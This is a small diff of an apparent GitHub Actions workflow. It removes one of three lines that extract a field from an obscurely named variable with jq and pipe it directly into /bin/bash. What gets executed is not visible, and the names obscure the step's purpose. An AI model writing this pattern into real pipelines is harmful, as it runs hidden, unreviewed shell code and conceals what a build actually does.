@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$ykcum862" | jq -r .ltl44211 | /bin/bash
           printf '%s' "$j128" | jq -r .fcw84485 | /bin/bash
-          printf '%s' "$t2544" | jq -r .h4658 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
